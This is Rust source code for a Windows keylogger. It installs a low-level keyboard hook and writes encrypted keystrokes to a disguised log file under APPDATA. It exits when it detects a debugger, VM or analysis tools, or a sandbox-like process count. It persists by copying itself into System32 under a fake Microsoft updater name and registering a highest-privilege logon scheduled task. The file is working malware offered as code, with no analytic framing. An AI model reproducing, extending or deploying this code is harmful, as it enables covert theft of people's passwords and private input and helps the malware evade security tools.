
use std::convert::identity;
use std::fs::{self, OpenOptions};
use std::os::windows::process::CommandExt;
use std::process;
use std::sync::Mutex;
use once_cell::sync::Lazy;
use std::io::Write;
use crate::encode::{self, Encode};
use std::path::{Path, PathBuf};
use rand::{rngs::StdRng, SeedableRng, Rng};
use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;

use windows::Win32::Foundation::{
    HWND, LPARAM, LRESULT, WPARAM
};
use windows::Win32::System::SystemInformation::{
    GetSystemInfo,
    SYSTEM_INFO,
    PROCESSOR_ARCHITECTURE,
    PROCESSOR_ARCHITECTURE_ALPHA,
    PROCESSOR_ARCHITECTURE_ALPHA64,
    PROCESSOR_ARCHITECTURE_AMD64,
    PROCESSOR_ARCHITECTURE_ARM,
    PROCESSOR_ARCHITECTURE_ARM64,
    PROCESSOR_ARCHITECTURE_ARM32_ON_WIN64,
    PROCESSOR_ARCHITECTURE_IA64,
    PROCESSOR_ARCHITECTURE_IA32_ON_ARM64,
    PROCESSOR_ARCHITECTURE_IA32_ON_WIN64,
    PROCESSOR_ARCHITECTURE_INTEL,
    PROCESSOR_ARCHITECTURE_MIPS,
    PROCESSOR_ARCHITECTURE_MSIL,
    PROCESSOR_ARCHITECTURE_NEUTRAL,
    PROCESSOR_ARCHITECTURE_PPC,
    PROCESSOR_ARCHITECTURE_SHX,
    PROCESSOR_ARCHITECTURE_UNKNOWN,
};

use windows::Win32::UI::WindowsAndMessaging::{
    CallNextHookEx,
    DispatchMessageW,
    GetMessageW,
    SetWindowsHookExA,
    TranslateMessage,
    UnhookWindowsHookEx,
    KBDLLHOOKSTRUCT,
    MSG,
    WH_KEYBOARD_LL,
    WM_KEYDOWN

};


use windows::Win32::UI::Input::KeyboardAndMouse::{

    GetKeyState, GetKeyboardState, MapVirtualKeyW, ToUnicode, MAPVK_VK_TO_VSC, VK_CAPITAL, VK_SHIFT
};

use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, PROCESSENTRY32, Process32First, Process32Next, TH32CS_SNAPPROCESS

};

// creates a global encoder
//randomizes key
static ENCODER: Lazy<Mutex<encode::Encode>> = Lazy::new(|| Mutex::new(Encode::new( StdRng::from_os_rng().r#gen())));

static KEYLOGGING_FILE: Lazy<PathBuf> = Lazy::new(|| {
    let appdata = std::env::var("APPDATA").expect("APPDATA not found");
    let mut path = PathBuf::from(appdata);
    path.push("Microsoft\\Windows\\security.log");
    path
});

pub fn get_windows_version() -> &'static str{
    let mut system_info = SYSTEM_INFO::default();

    unsafe {
        GetSystemInfo(&mut system_info);
    };

    let arch = unsafe {
        system_info.Anonymous.Anonymous.wProcessorArchitecture
    };

     get_system_arch(arch)
}

fn get_system_arch(arch: PROCESSOR_ARCHITECTURE) ->  &'static str {

    match arch {
        PROCESSOR_ARCHITECTURE_ALPHA => "Alpha",
        PROCESSOR_ARCHITECTURE_ALPHA64 => "Alpha64",
        PROCESSOR_ARCHITECTURE_AMD64 => "x64 (AMD or Intel 64-bit)",
        PROCESSOR_ARCHITECTURE_ARM => "ARM",
        PROCESSOR_ARCHITECTURE_ARM64 => "ARM64",
        PROCESSOR_ARCHITECTURE_ARM32_ON_WIN64 => "ARM32 on Win64",
        PROCESSOR_ARCHITECTURE_IA64 => "Intel Itanium (IA-64)",
        PROCESSOR_ARCHITECTURE_IA32_ON_ARM64 => "x86 emulation on ARM64",
        PROCESSOR_ARCHITECTURE_IA32_ON_WIN64 => "x86 emulation on Win64",
        PROCESSOR_ARCHITECTURE_INTEL => "x86 (32-bit)",
        PROCESSOR_ARCHITECTURE_MIPS => "MIPS",
        PROCESSOR_ARCHITECTURE_MSIL => "MSIL",
        PROCESSOR_ARCHITECTURE_NEUTRAL => "Neutral",
        PROCESSOR_ARCHITECTURE_PPC => "PowerPC",
        PROCESSOR_ARCHITECTURE_SHX => "SHX",
        PROCESSOR_ARCHITECTURE_UNKNOWN => "Unknown",
        _ => "Other / Reserved",
    }
}

pub unsafe fn set_windows_hook(){

    unsafe{

        let hook = SetWindowsHookExA(WH_KEYBOARD_LL, Some(keyboard_callback), None, 0).unwrap();

        println!("Hook is now listenting");

        let mut msg = MSG::default();

            // This keeps the thread alive to receive hook messages
        while GetMessageW(&mut msg, Some(HWND(std::ptr::null_mut())), 0, 0).as_bool() {
             let _ = TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }


        let _ = UnhookWindowsHookEx(hook);
    }
}

unsafe extern "system" fn keyboard_callback(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT{

    if code >= 0 && wparam.0 as u32 == WM_KEYDOWN  {

        let kb_struct = &*(lparam.0 as *const KBDLLHOOKSTRUCT);

        let vk_code = kb_struct.vkCode;

        println!("Key event: vkCode = {}, wParam = {}", vk_code, wparam.0);

        let key_pressed = match vk_code {
            8 => {"[BACKSPACE]"}
            9 => {"[TAB]"}
            13 => {"[ENTER]"}
            20 => {"[CAP]"}
            27 => {"[ESC]"}
            92 => {"[WIN]"}
            160 => {"[L-SHIFT]"}
            161 => {"[R-SHIFT]"}
            162 => {"[L-CTRL]"}
            163  => {"[R-CTRL]"}
            _ => &vk_code_to_char(vk_code).unwrap().to_string()
            
        };

        write_into_file(&key_pressed);

    }

    CallNextHookEx(None, code, wparam, lparam)
}

unsafe fn vk_code_to_char(vk_code:u32) -> Option<char>{

    unsafe{

        
        let mut keyboard_state = [0u8;256];

         let _ = GetKeyboardState(&mut keyboard_state);

            // Simulate Caps Lock toggle
        let caps = GetKeyState(VK_CAPITAL.0 as i32) & 0x0001;
        if caps != 0 {
            keyboard_state[VK_CAPITAL.0 as usize] |= 0x01;
        }

        // Simulate Shift pressed
        let shift = GetKeyState(VK_SHIFT.0 as i32);
        if (shift as u16) & 0x8000 != 0 {
            keyboard_state[VK_SHIFT.0 as usize] |= 0x80;
        }

        let mut char_buf = [0u16; 2];

        let scan_code = MapVirtualKeyW(vk_code, MAPVK_VK_TO_VSC);

        let _ = ToUnicode(vk_code, scan_code, Some(& keyboard_state),& mut char_buf, 0);
        
        
        char::from_u32(char_buf[0] as u32)

    }
}


fn write_into_file(button_pressed:& str){
    let mut enc = ENCODER.lock().unwrap();

    let mut data_file = OpenOptions::new()
    .create(true)
    .append(true).
    open(KEYLOGGING_FILE.as_path()).expect("Cannot open file");
    
    let enc = enc.encrypt(button_pressed);
    writeln!(data_file, "{}", &enc).expect("msg");
     
}

pub fn read_file() -> String{
    let mut dec = ENCODER.lock().unwrap();
    println!("{}",KEYLOGGING_FILE.display());
    dec.reset_key();

    OpenOptions::new()
        .create(true) // ← ensures the file exists
        .append(true) // ← opens without truncating
        .open(KEYLOGGING_FILE.as_path())
        .expect("Failed to create or open file");

    let read = fs::read_to_string(KEYLOGGING_FILE.as_path())
    .expect("can't read into file");

    let mut decode_string = String::new();

    for line in read.lines(){
        let decoded_char = dec.decrypt(line);

        decode_string.push_str(&decoded_char);
    }

    dec.reset_key();

    decode_string
}

pub fn delete_file(){

    match fs::remove_file(KEYLOGGING_FILE.as_path()){
        Ok(_) => {

        },
        Err(_) => {

        }
    };
}

// Checks for anti-analyis

//anti debugging
pub fn check_for_debugging(){
    unsafe{

        if IsDebuggerPresent().as_bool(){
            process::exit(1);
        }
    };
}

//function that takes a snap shot of the running process
pub fn check_for_process(){

    let warry_process = vec!["vboxservice.exe", "vmtoolsd.exe","wireshark.exe", "procmon.exe", "ollydbg.exe","x64dbg.exe"];

      unsafe {
        // Take a snapshot of all processes
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).unwrap();
        let mut num_process = 0;

        // Initialize PROCESSENTRY32 struct
        let mut pe32 = PROCESSENTRY32::default();
        pe32.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

        // checks for running process
        if Process32First(snapshot, &mut pe32).is_ok() {
            loop {
                num_process += 1;
                // Convert process name from WCHAR to Rust String
                let process_name = ansi_to_string(&pe32.szExeFile).to_lowercase();

                // println!("Process ID: {}, Name: {}", pe32.th32ProcessID, process_name);

                if warry_process.contains(&process_name.as_str()){
                    process::exit(1);
                }

                if !Process32Next(snapshot, &mut pe32).is_ok() {
                    break;
                }
            }
        }

        //if there is a small amount of process detected, exit
        //could be a sandbox
        if num_process < 30{
            println!("Too little process detected {}", num_process);
            std::process::exit(1);
        }

        
    }
}

//helper function
fn ansi_to_string(bytes: &[i8]) -> String {
    let nul_pos = bytes.iter().position(|&b| b == 0).unwrap_or(bytes.len());
    let u8_slice = &bytes[..nul_pos];
    let u8_slice = u8_slice.iter().map(|&b| b as u8).collect::<Vec<u8>>();
    String::from_utf8_lossy(&u8_slice).to_string()
}

//moves files and sets it as a sheduling task
pub fn mv_file(){

    let curr_file = std::env::current_exe().expect("Can't find");
    let new_file = std::path::Path::new("C:\\Windows\\System32\\MicrosoftSystemUpdater.exe");
    
    if new_file != curr_file.as_path(){
        const DETACHED_PROCESS: u32 = 0x00000008;
        fs::copy(&curr_file, &new_file).expect("Failed to copy to new location");
        let task_name = "MicrosoftSystemUpdater";

        let output = std::process::Command::new("schtasks")
        .args(&[
            "/Create",
            "/SC", "ONLOGON",                    // triggers quietly on user login
            "/TN", task_name,
            "/TR", new_file.to_str().unwrap(),
            "/RL", "HIGHEST",                    // run with admin rights
            "/F",                                // force create
        ])
        .output()
        .expect("failed to run schtasks");

        std::process::Command::new(new_file).creation_flags(DETACHED_PROCESS).spawn().unwrap();

        std::process::exit(0);

    }
}